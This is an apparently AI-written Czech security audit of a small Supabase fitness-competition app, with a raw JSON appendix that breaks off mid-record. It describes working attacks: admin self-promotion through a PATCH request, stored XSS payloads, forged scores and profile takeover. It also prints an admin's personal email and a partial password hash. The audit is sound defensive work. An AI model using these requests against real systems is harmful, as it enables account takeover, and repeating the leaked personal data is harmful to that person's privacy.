Tady je syntéza bezpečnostních nálezů od 5 auditorů. Sjednotil jsem duplicity (5 auditorů hlásilo XSS přes jméno, self-promote na admina a klientské body několikrát) a seřadil podle reálné závažnosti.

---

# Bezpečnostní audit Movement Challenge — souhrn pro Marka

Model je jasný: prohlížeč mluví přímo s databází veřejným klíčem, takže **jediná skutečná ochrana je RLS + triggery v databázi**. Vzhled appky nikoho nezastaví. Níže jsou nálezy seřazené tak, jak je doporučuju opravovat.

---

## (1) AKČNÍ — co je potřeba opravit

### CRITICAL

**C1. Kdokoliv se může povýšit na admina a převzít celou databázi** *(ověřeno API testem)*
- **Dopad (plain language):** Kdokoli na internetu se zaregistruje (e-mail se nepotvrzuje, viz H1), zabere si volný profil a jedním příkazem si nastaví "jsem admin". Jako admin pak může přepsat, přejmenovat nebo smazat KOHOKOLI, falšovat všem body, ukrást cizí profily. Auditoři to reálně vyzkoušeli proti test databázi — přejmenovali admina "Mára" na "Mara-HIJACK-TEST" (vrátili zpět). Tohle je nejhorší díra: dokud je otevřená, celé RLS nemá smysl.
- **Oprava:** Spustit už připravený `F52-rls-adminlock.sql` (trigger `players_guard_admin`) na TEST i PROD. *Soubor existuje, jen NENÍ nasazený.*
- **Ověřitelné API testem:** ANO — jako běžný uživatel zkusit `PATCH players?id=eq.<self> {is_admin:true}` → musí selhat.

**C2. Stored XSS přes jméno hráče — spustí se u všech, hlavně u admina** *(ověřitelné)*
- **Dopad:** Útočník si do svého jména uloží škodlivý kód (např. `<img src=x onerror=...>`). Jméno se zobrazuje neošetřené úplně všude — žebříček, přihlašovací obrazovka, karty. Jakmile appku otevře kdokoli jiný (hlavně admin), kód se spustí v JEHO prohlížeči a může z něj udělat cokoli (povýšit útočníka, smazat data). Stačí načíst žebříček, není potřeba na nic klikat.
- **Oprava:** Zavést jednu escape funkci (vzor `habitEsc` na ř.4004) a obalit jí KAŽDÉ vložení jména do `innerHTML`, ideálně vykreslovat přes `textContent`. Plus DB obrana: trigger/CHECK na `players.jmeno` odmítající `< > " '`.
- **Ověřitelné API testem:** ANO.

**C3. Stored XSS přes název cviku/aktivity** *(ověřitelné)*
- **Dopad:** Stejný princip jako C2, ale přes název cviku nebo aktivity. Tyhle názvy vidí každý v Historii a v "Posledních záznamech", takže kód se spustí u kohokoli, kdo si je zobrazí.
- **Oprava:** Escapovat `e.cvik` a `e.nazev` před vložením do `innerHTML` (stejná funkce jako C2). Plus DB validace textových sloupců.
- **Ověřitelné API testem:** ANO.

> Poznámka: C2 a C3 jsou tatáž třída chyby (neošetřený text do HTML). Vyřeší je jedna globální escape funkce použitá konzistentně na všechna uživatelská/DB textová pole. Doporučuju opravit najednou.

### HIGH

**H1. Potvrzení e-mailu je vypnuté → instantní účet pro kohokoli** *(ověřeno)*
- **Dopad:** Kdokoli se registruje i s neexistujícím e-mailem (`@example.com`) a OKAMŽITĚ má platnou session. Tím se otevírá vše ostatní — čtení celé databáze, claim profilů, eskalace. Je to "vstupní brána" pro útoky C1, H3, H4.
- **Oprava:** V Supabase Auth zapnout "Confirm email" na TEST i PROD.
- **Ověřitelné API testem:** ANO.

**H2. Body (skóre) počítá jen prohlížeč a posílá je do DB jako obyčejné číslo** *(ověřeno)*
- **Dopad:** Hráč pošle přímý požadavek `{body: 999999}` a okamžitě je první v žebříčku. RLS kontroluje jen čí to je řádek, ne jestli je číslo bodů reálné. Žádný trigger ani limit. Tohle je jádro férovosti celé appky.
- **Oprava:** Body nesmí přijímat klient. Buď (A) BEFORE INSERT/UPDATE trigger v DB, který body sám přepočítá ze vstupů a profilu a klientskou hodnotu zahodí, nebo (B) zápis přes RPC/Edge funkci. Vzorec se musí zduplikovat do SQL.
- **Ověřitelné API testem:** ANO.

**H3. Claim díra — uživatel si může na svém profilu odpojit/přepsat vazbu na účet** *(ověřitelné)*
- **Dopad:** Politika `players_upd` při self-update nehlídá, že `auth_user_id` zůstane vázané na uživatele. Hráč si může nastavit `auth_user_id = NULL` (odpojí profil → stane se zase "volným") nebo přepsat e-mail. To může vést ke ztrátě/převzetí profilu.
- **Oprava:** BEFORE UPDATE trigger: pokud se `auth_user_id` nebo `email` mění a uživatel není admin → odmítnout. Oddělit "claim" politiku od běžného self-update.
- **Ověřitelné API testem:** ANO.

**H4. Krádež identity kamaráda přes claim** *(ověřeno)*
- **Dopad:** Dokud je profil volný, může si ho zabrat KDOKOLI přihlášený, ne nutně ten správný člověk. V kombinaci s H1 (anonymní registrace) si cizí člověk během vteřin zabere profil reálného kamaráda. Žádné ověření identity. Auditoři ověřili — nový účet úspěšně zabral profil "Lukáš".
- **Oprava:** Claim chránit párovacím kódem/tokenem, který zná jen daný hráč, nebo profily přiřazovat ručně adminem. Minimálně zapnout potvrzení e-mailu (H1), aby to nešlo anonymně.
- **Ověřitelné API testem:** ANO.

**H5. Široký SELECT vystavuje e-maily a legacy hesla všem přihlášeným** *(ověřeno)*
- **Dopad:** Politika `players_sel using(true)` vrací VŠECHNY sloupce všech hráčů komukoli přihlášenému. Auditoři vyčetli e-mail admina i jeho starý nesolený SHA-256 hash hesla. Nesolený SHA-256 krátkého hesla (legacy login povoluje 3 znaky!) jde rychle prolomit offline → převzetí profilu mimo Supabase Auth. Plus únik e-mailů = soukromí a podklad pro phishing.
- **Oprava:** Nevracet citlivé sloupce — view `players_public` bez `email`/`password_hash`/`auth_user_id`, nebo column-level grants. Souvisí s odstraněním legacy loginu (viz odložené).
- **Ověřitelné API testem:** ANO.

### MEDIUM

**M1. Citlivé sloupce profilu lze libovolně přepsat (`aktivni`, `max_*`, `vaha`)** *(ověřitelné)*
- **Dopad:** `players_upd` hlídá jen čí je řádek, ne které sloupce. Hráč si může na sobě měnit cokoli kromě `is_admin` (a to jen až po nasazení C1). Hodnoty `max_*` a `vaha` vstupují do výpočtu bodů → nepřímé nafouknutí skóre. `aktivni` by měl měnit jen admin.
- **Oprava:** Po nasazení C1 rozšířit guard trigger o `aktivni` (a `auth_user_id` — viz H3). Na `max_*`/`vaha`/`vyska` přidat CHECK na rozumné rozsahy.
- **Ověřitelné API testem:** ANO.

**M2. Falšování audit logu (`player_history.changed_by_player_id`)** *(ověřitelné)*
- **Dopad:** Útočník může do své historie zapsat smyšlené záznamy a tvrdit, že změnu provedl třeba admin. Audit log není důvěryhodný. Cizímu hráči historii psát nemůže (to je OK).
- **Oprava:** Historii zapisovat výhradně triggerem na `players` (SECURITY DEFINER), který sám doplní `changed_by_player_id` a staré/nové hodnoty. Klientovi přímý INSERT zakázat.
- **Ověřitelné API testem:** ANO.

**M3. XSS v historii úprav (`old_value`/`new_value`/`field_name`)** *(ověřitelné)*
- **Dopad:** Stejná třída jako C2/C3. Modal "Historie úprav" vykresluje staré/nové hodnoty neošetřené. Historii cizího hráče otevírá hlavně admin → cílí přímo na něj. (Severity nižší než C2/C3, protože dosah je menší — historii otevírá málokdo.)
- **Oprava:** Stejná escape funkce na `old_value`, `new_value`, `field_name`.
- **Ověřitelné API testem:** ANO.

**M4. Chybí UNIQUE index na `players.auth_user_id`** *(ověřitelné)*
- **Dopad:** Funkce `current_player_id()` nemá `LIMIT 1`. Kdyby jeden účet měl víc profilů (přes admina nebo claim díru), funkce vrátí náhodný/chybný řádek a vlastnické kontroly RLS se rozpadnou.
- **Oprava:** `CREATE UNIQUE INDEX ON players (auth_user_id) WHERE auth_user_id IS NOT NULL;` + `LIMIT 1` do funkce. Pojistka, levná.
- **Ověřitelné API testem:** ANO.

**M5. CSS/atribut injection přes `barva`** *(ověřitelné)*
- **Dopad:** `barva` se vkládá neošetřená do `style="..."`. Není to spuštění JS (to v moderních prohlížečích z CSS nejde), ale lze přes `url()` exfiltrovat data nebo rozbít layout. Spíš doplněk k jmeno-XSS.
- **Oprava:** Validovat `barva` proti regexu `^#[0-9a-fA-F]{3,8}$` + vždy do uvozovek. DB CHECK na `players.barva`/`habits.barva`.
- **Ověřitelné API testem:** ANO.

**M6. Žádné CHECK constraints na `cviky`/`aktivity`** *(ověřitelné)*
- **Dopad:** Přímým API lze zapsat záporné/extrémní hodnoty (`opakovani = -5`, `km = -100`, `pridana_vaha = 99999`). Rozbije statistiky a součty. Klientská validace přímé API neřeší.
- **Oprava:** CHECK constraints na `opakovani > 0`, `body >= 0`, `km >= 0`, `pridana_vaha >= 0` s rozumnými stropy. Část vyřeší serverový přepočet bodů (H2).
- **Ověřitelné API testem:** ANO.

### LOW

**L1. `created_at` / `datum` přepisovatelné klientem** — lze zpětně "dopisovat" aktivity do minulosti a obejít denní limity/soutěžní okna. *Oprava:* `created_at` výhradně přes DEFAULT now() + trigger; `datum` validovat proti `<= current_date`. Ověřitelné: ANO.

**L2. Smyšlené datum záznamu** — varianta L1, datum jde nastavit do minulosti i budoucnosti přímým API. *Oprava:* trigger/CHECK `datum <= current_date` (a >= start výzvy). Ověřitelné: ANO.

**L3. Spoofing reakcí/odpovědí v chatu** — `chat_reactions`/`chat_messages` hlídají jen čí je řádek, ne `message_id`/`reply_to_id`. Lze přidat reakci svým jménem k cizí zprávě. Chat je dle kódu legacy, dopad malý. *Oprava:* FK + UNIQUE constraint, případně REVOKE insert pokud je chat mrtvý. Ověřitelné: ANO.

**L4. `habits.hodnota` bez horního limitu** — unique index a `>= 0` fungují (dobře), ale chybí strop a vazba na období návyku. Návyky nejdou do hlavního žebříčku, dopad malý. *Oprava:* volitelný horní CHECK. Ověřitelné: ANO.

**L5. Profilové vstupy do vzorce (`vaha`, `max_*`) bez rozsahů** — i při serverovém přepočtu bodů lze legálně nafouknout skóre nesmyslnými hodnotami (`vaha = 1`). *Oprava:* CHECK na rozsahy (řeší se s M1/M6). Doporučení: body fixovat z času zápisu, aby pozdější změna profilu nepřepočítala stará skóre. Ověřitelné: ANO.

**L6. Self-XSS přes `habits.ikona`** — neošetřené, ale návyky vidí jen vlastní hráč → zasáhne jen útočníka samotného. Eskaluje, jen kdyby šly zobrazit cizí návyky. *Oprava:* escapovat/validovat ikonu. Ověřitelné: ANO.

**L7. Enumerace e-mailů přes signup** — signup vrací rozlišitelnou chybu "už registrovaný". Dopad malý (e-maily stejně tečou z H5). Reset endpoint enumeraci neumožňuje. *Oprava:* vyřeší se s H1 + neutrální hláška. Ověřitelné: ANO.

**L8. Legacy heslový login (`password_hash`)** — *(MEDIUM, ale řadím k odloženým, viz níže)*

**L9. Lokální zálohy DB obsahují hesla a e-maily v plaintextu** *(MEDIUM)* — `backups/*.json` jsou snapshoty celé DB včetně `password_hash` a e-mailů. Kdo získá disk, má hashe všech hesel. Zálohy NEjsou v gitu (dobře). *Oprava:* `db-backup.js` by měl `password_hash`/`email` z exportu vynechat (whitelist sloupců); staré snapshoty smazat/zašifrovat. Ověřitelné: ne (data at rest).

**L10. Recovery session = plné přihlášení** — po kliknutí na reset odkaz vznikne plná session. Kód to ošetřuje, ale na sdíleném zařízení může přežít. *Oprava:* `signOut()` po nastavení nového hesla; ověřit OTP expiraci v Supabase. Ověřitelné: ne.

**L11. Natvrdo zapsané heslo zálohovacího účtu v `db-backup.js`** — plaintext login pro TEST DB. Soubor není v gitu, jen TEST. *Oprava:* přesunout do gitignored `.env`. Ověřitelné: ANO.

---

## (2) UŽ OŠETŘENÉ / ODLOŽENÉ

- **is_admin trigger (řeší C1):** `F52-rls-adminlock.sql` je PŘIPRAVEN, ale ZATÍM NESPUŠTĚN na DB. → Toto je akční položka C1 výše, jen čeká na spuštění.
- **Legacy `password_hash` + heslový login (L8):** odloženo do redesignu auth. Souvisí s H5 (hash uniká) a L9. Dokud existuje, je to paralelní slabší přihlašovací cesta + `localStorage` admin-device bypass. Při redesignu: smazat sloupec, odstranit `startLoginFlow`, `is_admin` brát jen z přihlášeného účtu (ne z localStorage).
- **Supabase klíče (INFO — vše OK):** V kódu je jen veřejný publishable (anon) klíč, žádný service_role. Oddělení test/prod je správné. Žádná oprava. Doporučení: nikdy nepřidávat service_role do klientského kódu.
- **Žádné tokeny třetích stran (INFO — OK):** Grep nenašel žádné reálné tokeny, `.env` s tajemstvími ani citlivé komentáře.

---

## TOP doporučené pořadí oprav

1. **C1 — Spustit `F52-rls-adminlock.sql` na TEST i PROD.** Nejmenší úsilí, největší dopad. Hotový soubor, jen ho pustit. Bez tohoto je všechno ostatní zbytečné.
2. **H1 — Zapnout "Confirm email" v Supabase (TEST i PROD).** Pár kliků, zavře vstupní bránu pro C1/H3/H4.
3. **C2 + C3 + M3 — Jedna globální escape funkce na všechna textová pole** (jméno, cvik, název, historie). Jedna oprava, tři critical/high nálezy.
4. **H5 — Skrýt `email`/`password_hash`/`auth_user_id` ze SELECTu** (view nebo column grants).
5. **H3 + H4 + M1 + M4 — Zpevnit profil:** guard trigger rozšířit o `auth_user_id`/`aktivni`, oddělit claim politiku, UNIQUE index na `auth_user_id`, claim přes párovací kód.
6. **H2 — Přesunout výpočet bodů na server** (trigger/RPC). Větší práce (duplikace vzorce do SQL), ale jádro férovosti.
7. **M6 + M5 + L1/L2 + L5 — CHECK constraints** (rozsahy hodnot, barva, datum, profilové vstupy). Lze nasadit hromadně jedním SQL.
8. **Zbytek LOW (L3, L4, L6, L7, L9–L11)** — řešit při redesignu auth spolu s odstraněním legacy `password_hash`.

**Upřímná poznámka k závažnosti:** Pro uzavřenou partu 7 přátel je největší reálné riziko C1 + H1 (kdokoli zvenčí převezme DB) a XSS (C2/C3). Body-cheating (H2) je vážné pro férovost soutěže, ale ne "bezpečnostní katastrofa". LOW nálezy jsou většinou kosmetika integrity dat — nepřeháněl bych je. Po krocích 1–4 (vesměs konfigurace + jeden SQL + jedna JS funkce) jste z 90 % venku.


# Příloha: syrové nálezy (JSON)

```json
[
  {
    "title": "body (skóre) je zapisovatelné klientem bez jakékoli serverové validace → libovolné body / podvádění",
    "severity": "high",
    "area": "rls",
    "attack": "Přihlášený si přes přímé PostgREST volání vloží do cviky/aktivity vlastní řádek s libovolně vysokým body (player_id = vlastní). RLS kontroluje JEN player_id (with check: player_id = current_player_id() or current_is_admin()), hodnotu body neřeší žádný trigger ani CHECK constraint. Příklad: POST /rest/v1/aktivity {player_id: <moje>, nazev:'x', uroven:1, body: 999999, datum:'2026-06-01'} → vyleze první v žebříčku. Body se počítá výhradně v prohlížeči (index.html:5305, 5318, 5348, 5405) a posílá rovnou do DB (index.html:5340, 5366, 5391, 5420).",
    "evidence": "F52-rls-v2.sql:39 with check (player_id = public.current_player_id() or public.current_is_admin()) — žádné omezení na sloupec body; index.html:5340 db.from('cviky').insert(payload) kde payload.body=totalBody (klientský výpočet)",
    "empiricallyTestable": true,
    "fix": "Body NESMÍ být klientský vstup. Buď (a) body počítat triggerem v DB (BEFORE INSERT/UPDATE přepíše NEW.body podle opakovani/uroven/pridana_vaha a profilu hráče), nebo aspoň (b) CHECK constraint na rozumný horní limit + serverová funkce. Ideálně přesunout celý bodovací vzorec do SQL/Edge funkce a sloupec body z klientského insertu úplně vyřadit (GRANT bez sloupce / trigger ignorující NEW.body).",
    "dim": "see"
  },
  {
    "title": "created_at (a datum) jsou zapisovatelné/přepisovatelné klientem",
    "severity": "low",
    "area": "rls",
    "attack": "Při insertu/update do cviky/aktivity/habit_logs/chat_messages může uživatel poslat libovolné created_at i datum — RLS to nehlídá. Umožňuje zpětně 'dopisovat' aktivity do minulosti (obejití denních limitů / soutěžních oken), nebo posunout pořadí. datum dokonce app sama nechává editovat (index.html:5335 komentář 'uzivatel mohl upravit datum').",
    "evidence": "F52-rls-v2.sql:39-40 (insert/update with check řeší jen player_id); schéma: cviky.created_at, aktivity.created_at default now() ale není chráněn",
    "empiricallyTestable": true,
    "fix": "created_at nastavovat výhradně DEFAULT now() a odebrat ze zapisovatelných sloupců (column-level GRANT) nebo BEFORE trigger: NEW.created_at = now() (a u UPDATE NEW.created_at = OLD.created_at). Pokud má soutěž časová okna, validovat datum triggerem proti povolenému rozsahu.",
    "dim": "see"
  },
  {
    "title": "players.aktivni (a další citlivé sloupce profilu) lze přepsat na vlastním profilu bez kontroly hodnoty",
    "severity": "medium",
    "area": "rls",
    "attack": "players_upd dovolí update vlastního řádku (id = current_player_id()) bez omezení KTERÉ sloupce. Uživatel si tak může na sobě měnit cokoli kromě is_admin (ten hlídá trigger players_guard_admin, ale ten ZATÍM není na DB nasazen). Kromě is_admin nikdo nehlídá aktivni, jmeno, max_* hodnoty (max_shyby/drep/... vstupují do bodovacího vzorce → nepřímé navýšení bodů), barva, vaha/vyska. Nastavením vysokých max_* nebo manipulací profilu lze ovlivnit výpočet bodů.",
    "evidence": "F52-rls-v2.sql:50-60 players_upd — using/with check jen na úroveň ŘÁDKU, žádná kontrola sloupců; trigger guard řeší pouze is_admin (F52-rls-v2.sql:66-76) a navíc dle zadání NENÍ nasazen",
    "empiricallyTestable": true,
    "fix": "Nasadit F52-rls-adminlock.sql (potvrzeno jako připravené). Navíc zvážit column-level ochranu citlivých sloupců, které ovlivňují skóre (max_*), nebo je validovat triggerem (rozumné rozsahy). aktivni by mělo měnit jen admin — rozšířit guard trigger o aktivni.",
    "dim": "see"
  },
  {
    "title": "Claim free profilu: WITH CHECK dovolí při 'claimu' nastavit i auth_user_id na cizí profil a zároveň nevyžaduje, aby šlo opravdu o volný profil",
    "severity": "high",
    "area": "rls",
    "attack": "players_upd USING obsahuje větev '(auth_user_id is null and current_player_id() is null)' = uživatel BEZ profilu smí updatovat JAKÝKOLI volný profil. WITH CHECK pak povolí výsledek pokud 'auth_user_id = auth.uid()'. Problém: USING (předběžný výběr řádku) testuje STARÉ hodnoty, WITH CHECK NOVÉ. Uživatel bez profilu tedy může na libovolný volný profil vložit svoje auth.uid() → claim. To je sice zamýšlené, ALE: (1) nehlídá se, že uživatel claimne JEN JEDEN profil sekvenčně po sobě (po prvním claimu už current_player_id() != null, takže USING větev pro free profily padne — to drží). (2) Větší díra: WITH CHECK připouští i 'id = current_player_id()' → po claimu si vlastník profilu může na SVŮJ řádek přepsat auth_user_id na jinou hodnotu? Ne — auth.uid() je fixní. Reálná díra je v kombinaci s předchozím: protože update vlastního profilu (id = current_player_id()) v USING projde a WITH CHECK '...or auth_user_id = auth.uid()' nehlídá, že auth_user_id ZŮSTANE = auth.uid(): uživatel si může na svém profilu nastavit auth_user_id = NULL (uvolnit/odpojit) a tím obejít vazbu, případně email na cizí. Po nastavení auth_user_id=NULL je profil zase 'volný' a current_player_id() přestane fungovat.",
    "evidence": "F52-rls-v2.sql:50-60. WITH CHECK = 'id = current_player_id() or current_is_admin() or auth_user_id = auth.uid()'. Update vlastního řádku se NEW.auth_user_id=NULL projde přes 'id = current_player_id()' (počítá se ze STARÉ hodnoty přes SECURITY DEFINER funkci), aniž by se hlídalo zachování auth_user_id.",
    "empiricallyTestable": true,
    "fix": "Rozdělit politiky: (a) samostatná 'claim' policy jen pro volné profily, která ve WITH CHECK vyžaduje auth_user_id = auth.uid() AND OLD by se ideálně řešilo triggerem; (b) běžný self-update zakázat měnit auth_user_id/email triggerem (BEFORE UPDATE: if NEW.auth_user_id is distinct from OLD.auth_user_id and not current_is_admin() then raise). Tím se zabrání odpojení/přepsání vazby a krádeži profilu.",
    "dim": "see"
  },
  {
    "title": "player_history: changed_by_player_id lze podvrhnout (audit log je důvěryhodný jen kvůli klientovi, ne kvůli RLS)",
    "severity": "medium",
    "area": "rls",
    "attack": "player_history insert RLS hlídá jen player_id = current_player_id() or admin. changed_by_player_id (KDO změnu provedl) NENÍ ničím ověřen. Útočník může vložit historii o svém profilu (player_id = vlastní) s changed_by_player_id ukazujícím na kohokoli (např. admina) → falšování audit logu. Navíc, protože je insert povolen jen pro VLASTNÍ player_id, útočník NEMŮŽE psát historii cizímu hráči (to je OK), ale může do vlastní historie psát smyšlené záznamy. Hodnoty old_value/new_value jsou rovněž volné → log neodpovídá realitě v players.",
    "evidence": "F52-rls-v2.sql:39 generická insert policy pro player_history kontroluje pouze player_id; index.html:5650-5656 changed_by_player_id = state.editorPlayer (klientská hodnota)",
    "empiricallyTestable": true,
    "fix": "player_history zapisovat výhradně triggerem na players (AFTER UPDATE) v SECURITY DEFINER, který sám doplní changed_by_player_id = current_player_id() a old/new z OLD/NEW. Klientovi přímý INSERT do player_history zakázat (REVOKE insert / policy false). Tím je audit log důvěryhodný.",
    "dim": "see"
  },
  {
    "title": "chat_reactions a chat_messages: kontroluje se jen player_id, ne unikátnost/cizí reply_to_id ani message_id ownership",
    "severity": "low",
    "area": "rls",
    "attack": "chat_reactions insert: RLS hlídá player_id = current_player_id(). message_id a emoji jsou volné → útočník může přidat reakci k libovolné cizí zprávě (message_id na cokoli) svým jménem; chybí kontrola duplicit (stejný player+message+emoji vícekrát) na úrovni RLS (řeší se až UNIQUE constraintem, pokud existuje — neověřeno v SQL souboru). chat_messages: reply_to_id je volné, lze 'odpovědět' na neexistující/cizí id. Funkční dopad malý (chat je dle index.html:3432 spíš legacy/backup), ale spoofing reakcí svým jménem na cizí zprávy je možný.",
    "evidence": "F52-rls-v2.sql:35-41 generická politika pro chat_reactions/chat_messages řeší výhradně player_id; v F52 souboru chybí jakýkoli UNIQUE/FK constraint na chat_reactions(message_id, player_id, emoji)",
    "empiricallyTestable": true,
    "fix": "Doplnit FK message_id → chat_messages(id) ON DELETE CASCADE a UNIQUE(message_id, player_id, emoji) pro chat_reactions; obdobně reply_to_id → chat_messages(id). RLS ownership na player_id je tady správně; constrainty doplní integritu. Pokud je chat opravdu legacy, zvážit REVOKE insert úplně.",
    "dim": "see"
  },
  {
    "title": "current_player_id() vrací nedeterministicky řádek, pokud má jeden auth.uid() víc profilů (chybí UNIQUE na auth_user_id)",
    "severity": "medium",
    "area": "rls",
    "attack": "current_player_id() = 'select id from players where auth_user_id = auth.uid()' bez LIMIT/aggregace. V kombinaci s claim dírou (viz výše: nastavení auth_user_id na svůj na víc řádcích, nebo admin přiřadí 2 profily) by funkce ve scalar kontextu vrátila chybu/náhodný řádek. Pokud by se podařilo claimnout 2 profily (např. časováním mezi USING/WITH CHECK, nebo přes admina), RLS porovnání 'player_id = current_player_id()' se stává nespolehlivé a může umožnit zápis pod nesprávný profil. Hlavní obrana je UNIQUE index na players.auth_user_id, který ale ve F52 SQL NENÍ.",
    "evidence": "F52-rls-v2.sql:8-11 current_player_id() bez LIMIT 1; v SQL souborech není 'create unique index ... on players(auth_user_id)'",
    "empiricallyTestable": true,
    "fix": "CREATE UNIQUE INDEX ON public.players (auth_user_id) WHERE auth_user_id IS NOT NULL; a do current_player_id() přidat LIMIT 1 jako pojistku. Tím je 1 auth = max 1 profil zaručeno na úrovni DB.",
    "dim": "see"
  },
  {
    "title": "Potvrzení: self-promote na admina (is_admin) přes vlastní profil — trigger připraven, ale NENÍ nasazen",
    "severity": "critical",
    "area": "rls",
    "attack": "Dle players_upd může uživatel updatovat vlastní řádek včetně is_admin=true (RLS rozlišuje jen řádek, ne sloupec). current_is_admin() pak vrátí true → plný admin (insert/delete players, zápis pod jakýkoli player_id, obejití všech vlastnických kontrol). Ochranu má pouze trigger players_guard_admin, který dle zadání ZATÍM NENÍ na DB spuštěn. Dokud není nasazen, je toto plně zneužitelné.",
    "evidence": "F52-rls-v2.sql:50-60 (žádné omezení sloupce is_admin v politice) + F52-rls-adminlock.sql (trigger existuje, ale dle zadání nespuštěn na DB); index.html nikde is_admin neposílá, ale to není ochrana (přímé API volání).",
    "empiricallyTestable": true,
    "fix": "NEPRODLENĚ spustit F52-rls-adminlock.sql na TEST i PROD (vytvoří trigger players_guard_admin). Ověřit empiricky: jako běžný uživatel zkusit PATCH players?id=eq.<self> {is_admin:true} → musí selhat 'Only an admin can change is_admin'. Doporučuji guard trigger rozšířit i o auth_user_id a aktivni (viz ostatní nálezy).",
    "dim": "see"
  },
  {
    "title": "Potvrzení & rozšíření: self-eskalace na admina dává plnou kontrolu nad cizími účty (převzetí cizího profilu)",
    "severity": "critical",
    "area": "auth",
    "attack": "1) Kdokoliv se přes signup formulář (db.auth.signUp) zaregistruje a OKAMŽITĚ dostane platnou session (potvrzení e-mailu je na test DB vypnuté). 2) Přes claimPlayer (PATCH players.auth_user_id) si zabere libovolný volný profil. 3) Protože trigger players_guard_admin NENÍ na DB nasazený, pošle PATCH {is_admin:true} na svůj řádek (index.html:2494 cesta + RLS players_upd větev id=current_player_id()). 4) Jako admin (current_is_admin()=true) teď RLS větev players_upd 'or public.current_is_admin()' povolí UPDATE/DELETE JAKÉHOKOLIV řádku — útočník přepíše/přejmenuje cizí profily, přemapuje cizí auth_user_id, smaže hráče, falšuje cviky/aktivity všech. Ověřeno empiricky proti test DB: T3 nastavil is_admin=true na claimnutém Lukášovi, T4 pak přejmenoval reálný admin profil 'Mára' na 'Mara-HIJACK-TEST' (vše vráceno do původního stavu).",
    "evidence": "index.html:2490-2501 claimPlayer + F52-rls-v2.sql:50-60 players_upd (větev 'or public.current_is_admin()'); empiricky: signup vrátil access_token s email_confirmed_at hned, PATCH is_admin=true uspěl (Lukáš is_admin:true), PATCH na Márě uspěl (jmeno:'Mara-HIJACK-TEST')",
    "empiricallyTestable": true,
    "fix": "NASADIT F52-rls-adminlock.sql (trigger players_guard_admin) na TEST i PROD — to je nutná podmínka, jinak je celé RLS bez ceny. Navíc zvážit oddělení 'admin píše' od běžné self-update politiky a/nebo přesun is_admin do auth.users app_metadata (mimo dosah uživatelského UPDATE).",
    "dim": "see"
  },
  {
    "title": "Potvrzení & upřesnění: claim si může zabrat JEN první volný profil, ale je nevratný a útočník může 'ukrást' identitu kamaráda dřív než on sám",
    "severity": "high",
    "area": "auth",
    "attack": "Policy players_upd dovolí claim přes větev '(auth_user_id is null and current_player_id() is null)'. Empiricky ověřeno: nově zaregistrovaný uživatel ÚSPĚŠNĚ zabral volný profil 'Lukáš' (T1). Druhý volný profil už zabrat nešlo (T2 = []), protože current_player_id() už není null — to je správně. ALE: dokud je profil volný (auth_user_id IS NULL), může si ho zabrat KDOKOLIV přihlášený, ne nutně ten správný člověk. Vzhledem k vypnutému potvrzení e-mailu se kdokoli zvenčí během vteřin přihlásí a zabere si profil reálného kamaráda (a tím získá zápis pod jeho jménem). Žádné ověření, že claimující osoba je opravdu daný hráč (UI confirm v legacy větvi tu neplatí — claim jde i přímým API voláním).",
    "evidence": "F52-rls-v2.sql:50-60; index.html:2490-2501 (claimPlayer bez jakéhokoli ověření identity); empiricky T1 claim Lukáš uspěl, T2 druhý claim Káťa vrátil []",
    "empiricallyTestable": true,
    "fix": "Claim chránit out-of-band: buď admin přiřazuje profily ručně, nebo párovat přes invite token/kód, který zná jen daný hráč (uložit hash kódu k profilu, claim ověřit proti němu). Minimálně zapnout potvrzení e-mailu, aby útok nešel anonymně a hromadně.",
    "dim": "see"
  },
  {
    "title": "Vypnuté potvrzení e-mailu na test DB → instantní autentizovaná session pro kohokoliv (předpoklad všech ostatních útoků)",
    "severity": "high",
    "area": "auth",
    "attack": "POST /auth/v1/signup vrací rovnou access_token s email_confirmed_at vyplněným a email_verified:true — žádné kliknutí na potvrzovací e-mail. Útočník tak bez vlastního e-mailu (i s neexistujícím @example.com) získá roli 'authenticated', čímž projde RLS '... to authenticated using(true)' a může číst celou DB + claimovat + (kvůli chybějícímu triggeru) eskalovat. Kód v mcAuthSubmit s variantou 'potvrď e-mail' (index.html:2449) počítá s tím, že potvrzení je zapnuté — na test DB to ale neplatí.",
    "evidence": "Empiricky: signup audit_test_...@example.com vrátil JSON s access_token a \"email_confirmed_at\":\"2026-06-29T...\", \"email_verified\":true; index.html:2444-2449",
    "empiricallyTestable": true,
    "fix": "V Supabase Auth zapnout 'Confirm email' (Email provider → Confirm email = ON) na TEST i PROD. Ověřit, že signUp bez potvrzení nevrací session. Případně omezit povolené e-mailové domény.",
    "dim": "see"
  },
  {
    "title": "RLS players_sel using(true) vystavuje každému přihlášenému: cizí e-maily (PII), legacy password_hash a auth_user_id",
    "severity": "high",
    "area": "auth",
    "attack": "Politika 'players_sel ... using (true)' vrací VŠECHNY sloupce VŠECH hráčů komukoliv s rolí authenticated (a tu získá kdokoli přes self-signup). Empiricky vyčteno: e-mail admina 'mara.kadrmas@gmail.com' a jeho legacy password_hash '90c84fa5...' (nesolený SHA-256). Nesolený SHA-256 krátkého hesla (legacy login dovoluje i 3 znaky) jde offline rychle prolomit; legacy login (startLoginFlow → sha256Hex → porovnání s password_hash) tento hash pořád přijímá, takže prolomené heslo vede k převzetí profilu mimo Supabase Auth. Zároveň únik e-mailů = porušení soukromí a podklad pro phishing.",
    "evidence": "F52-rls-v2.sql:48 (players_sel using true); empiricky select vrátil pro 'Mára' email + password_hash + auth_user_id; index.html:3503-3513 (legacy login porovnává sha256 hesla s password_hash), 3490 (min. délka 3 znaky)",
    "empiricallyTestable": true,
    "fix": "Nevracet citlivé sloupce přes široký SELECT: buď omezit politiku/selekt jen na nutné sloupce přes view (players_public bez email/password_hash/auth_user_id), nebo column-level grants. Současně NADOBRO smazat sloupec password_hash a vyřadit legacy login (startLoginFlow), aby existovala jen jedna cesta — Supabase Auth.",
    "dim": "see"
  },
  {
    "title": "Legacy heslový login (password_hash) stále funguje jako paralelní, slabší autentizační cesta",
    "severity": "medium",
    "area": "auth",
    "attack": "Vedle Supabase Auth existuje v kódu druhá, nezávislá přihlašovací cesta: startLoginFlow čte/píše players.password_hash (nesolený SHA-256, min. 3 znaky) přímo přes PostgREST. Vlastník claimnutého profilu si může password_hash kdykoli přepsat (je to jen sloupec na jeho řádku, RLS update ho povolí). Kombinace 'hash je veřejně čitelný' (viz výše) + 'hash chrání slabé heslo' + 'admin-device bypass' (isAdminDevice obejde heslo úplně) dělá z legacy cesty trvalou zadní vrátka, dokud sloupec a kód existují. localStorage 'mc-is-admin-device' navíc trvale označí zařízení jako admin (selectPlayer:3546-3547), takže kdokoli s fyzickým/XSS přístupem k localStorage získá admin UI bypass.",
